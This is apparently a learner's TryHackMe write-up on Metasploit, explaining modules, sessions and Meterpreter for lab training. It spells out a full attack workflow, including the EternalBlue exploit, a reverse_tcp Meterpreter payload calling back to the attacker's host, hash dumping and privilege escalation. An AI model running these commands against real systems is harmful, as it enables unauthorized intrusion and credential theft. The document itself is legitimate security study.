# Metasploit — TryHackMe Writeup

## Overview
| Field | Details |
|-------|---------|
| Platform | TryHackMe |
| Rooms | Metasploit: Introduction, Exploitation, Meterpreter |
| Path | Cyber Security 101 |
| Difficulty | Easy - Medium |
| Date | May 2026 |
| Author | Ibrahim Babarinde |

---

## What The Rooms Are About

The Metasploit rooms on TryHackMe cover one of the most powerful and
widely used penetration testing frameworks in the industry. Across three
rooms — Introduction, Exploitation, and Meterpreter — you learn how
to use Metasploit to find vulnerabilities, exploit them, gain access
to target machines, and perform post-exploitation activities. The rooms
are entirely hands-on and follow a real penetration testing workflow
from start to finish.

---

## Tools Used

- Metasploit Framework (msfconsole)
- Nmap
- Meterpreter

---

## Key Concepts Covered

### 1. What Is Metasploit?

Metasploit Framework is the world's most widely used penetration testing
platform. It gives security professionals a structured way to find,
test, and exploit vulnerabilities in systems — simulating exactly what
a real attacker would do, in a controlled and legal environment.

**What Metasploit does:**
- Simulates real attacks against target systems
- Tests whether known vulnerabilities can actually be exploited
- Gains access to machines during authorized penetration tests
- Helps understand exactly how attackers operate

**Real world example:**
If a server is running an old, unpatched version of SMB, Metasploit
can use a pre-built exploit to test whether that vulnerability can be
abused to gain unauthorized access — confirming the risk so it can
be fixed before a real attacker finds it.

---

### 2. Launching Metasploit

The Metasploit console — `msfconsole` — is the main command-line
interface for interacting with the entire framework:

```bash
msfconsole
```

After loading you will see:
```
msf6 >
```

This is your control center. Everything in Metasploit happens from here —
searching for exploits, configuring payloads, running attacks, and
managing sessions.

---

### 3. Core Metasploit Terminology

Understanding these terms is essential before using Metasploit in
any real engagement.

---

#### Module
A module is a self-contained component that performs a specific task
inside Metasploit. Think of it like a tool inside a toolbox. Every
exploit, payload, scanner, and post-exploitation script is a module.

---

#### Exploit
An exploit is code that takes advantage of a specific vulnerability
in a target system to gain unauthorized access.

```bash
exploit/windows/smb/ms17_010_eternalblue
```

This exploit targets the EternalBlue vulnerability in Windows SMB —
the same vulnerability used in the WannaCry ransomware attack that
infected over 200,000 machines worldwide in 2017.

---

#### Payload
A payload is what executes on the target machine after the exploit
successfully opens a connection. The exploit opens the door —
the payload is what walks through it.

**Types of payloads:**
- **Reverse shell** — target connects back to your machine
- **Bind shell** — you connect to a listener on the target
- **Meterpreter** — advanced interactive shell running in memory

```bash
windows/meterpreter/reverse_tcp
```

This payload gives you full remote control of the target machine
through a Meterpreter session.

---

#### Auxiliary
Auxiliary modules perform supporting tasks that are not direct
exploitation. They are used during the reconnaissance and enumeration
phase.

**Examples:**
- Port scanning
- Service version detection
- SMB login testing
- Vulnerability scanning

```bash
auxiliary/scanner/portscan/tcp
```

---

#### Post
Post modules run after you have already gained access to a machine.
They extend your access and help you gather more information.

**What post modules do:**
- Privilege escalation
- Password and hash dumping
- Collecting system information
- Establishing persistence

```bash
post/windows/gather/hashdump
```

This dumps all password hashes from a compromised Windows machine.

---

### 4. The `search` Command

The `search` command finds modules inside Metasploit's database.

```bash
search <keyword>
```

**Examples:**

```bash
# Search by vulnerability name
search eternalblue

# Search by protocol
search smb

# Search by CVE number
search CVE-2017-0144

# Search by platform
search platform:windows type:exploit
```

Metasploit returns a ranked list of matching modules with their
name, disclosure date, rank, and description.

---

### 5. The `use` Command

The `use` command selects a module and makes it active:

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

After selecting, the prompt changes to show the active module:

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

You can also use the number from search results:

```bash
use 0
```

---

### 6. Essential Commands

#### `show options`
Displays all configurable settings for the active module — including
which ones are required before you can run it.

```bash
show options
```

Common options you will always need to set:
- `RHOSTS` — target IP address
- `RPORT` — target port
- `LHOST` — your machine's IP (for reverse connections)
- `LPORT` — your listening port

---

#### `set`
Assigns a value to a module option:

```bash
# Set the target IP
set RHOSTS 10.10.10.x

# Set your IP for reverse connection
set LHOST 10.x.x.x

# Set the payload
set PAYLOAD windows/meterpreter/reverse_tcp
```

---

#### `run` or `exploit`
Executes the active module against the target:

```bash
run
```
or
```bash
exploit
```

Both do the same thing. If the exploit succeeds, a session opens.

---

#### `back`
Exits the current module and returns to the main msfconsole prompt:

```bash
back
```

---

#### `info`
Displays detailed information about the current module:

```bash
info
```

Shows the module description, author, references, supported targets,
required options, and compatible payloads. Always run `info` before
using an unfamiliar module.

---

### 7. Sessions — Managing Access

A session is an active connection to a compromised target machine.
When an exploit succeeds, Metasploit opens a session:

```
Meterpreter session 1 opened (10.x.x.x:4444 -> 10.10.10.x:49152)
```

This means you have live access to the target machine.

---

#### Managing Sessions

```bash
# View all active sessions
sessions

# Interact with a specific session
sessions -i 1

# Background a session (keep it alive, return to console)
background

# Kill a session
sessions -k 1

# List sessions with verbose details
sessions -v
```

**Why session management matters:**
In a real penetration test you may have multiple machines compromised
at the same time. Being able to background one session, pivot to
another machine, and come back to the first session is a critical
skill for complex engagements.

---

### 8. Meterpreter — Post Exploitation

Meterpreter is Metasploit's most powerful payload. Unlike a basic
command shell, Meterpreter runs entirely in the target machine's
memory — leaving minimal traces on disk and making it much harder
to detect.

**Core Meterpreter commands:**

```bash
# Who are you on the target machine
getuid

# System information
sysinfo

# Dump password hashes
hashdump

# List running processes
ps

# Navigate the file system
ls
cd
pwd

# Upload a file to the target
upload file.txt

# Download a file from the target
download passwords.txt

# Open a system shell
shell

# Escalate privileges
getsystem

# Take a screenshot
screenshot
```

---

## The Full Metasploit Workflow

Every Metasploit engagement follows this structured sequence:

```
1. RECONNAISSANCE
   nmap -sV -sC target_ip
   → Identify open ports and running services

2. SEARCH
   search <vulnerability or service>
   → Find the right exploit module

3. SELECT
   use exploit/path/to/module
   → Activate the module

4. CONFIGURE
   show options
   set RHOSTS target_ip
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST your_ip
   → Set all required options

5. EXECUTE
   run
   → Launch the exploit

6. POST-EXPLOITATION
   getuid / sysinfo / hashdump
   → Gather information and demonstrate impact
```

---

## What I Learned

The Metasploit rooms taught me how real exploitation works from
start to finish — not just the theory but the actual hands-on
workflow that penetration testers follow in real engagements.

**Key lessons:**

**1. Enumeration comes before everything**
You cannot exploit what you do not understand. Nmap first, always.
The better your reconnaissance, the better your chances of finding
the right exploit.

**2. The exploit opens the door — the payload matters just as much**
Choosing the right payload determines what you can do after gaining
access. Meterpreter gives significantly more capability than a
basic command shell.

**3. Session management is a real skill**
Managing multiple sessions, backgrounding them, and pivoting between
machines is what separates basic Metasploit users from advanced ones.

**4. Post-exploitation is where the real impact is demonstrated**
Getting in is step one. What you do after — dumping hashes, escalating
privileges, pivoting — is what shows the true risk of a vulnerability
in a real penetration test report.

---

## Important Note On Ethics

Metasploit is an extremely powerful framework that can cause serious
damage if misused. Everything practiced in these rooms was done on
dedicated TryHackMe lab machines in completely isolated environments.
Using Metasploit against any system without explicit written permission
is illegal under computer misuse laws in most countries.

---

## Resources

- [TryHackMe — Metasploit Introduction](https://tryhackme.com/room/metasploitintro)
- [TryHackMe — Metasploit Exploitation](https://tryhackme.com/room/metasploitexploitation)
- [TryHackMe — Meterpreter](https://tryhackme.com/room/meterpreter)
- [Metasploit Official Documentation](https://docs.metasploit.com/)
- [Rapid7 Metasploit Framework](https://www.metasploit.com/)

---

*Written by Ibrahim Babarinde | [GitHub](https://github.com/ibrahim-babarinde) | [TryHackMe](https://tryhackme.com/p/Anzai)*
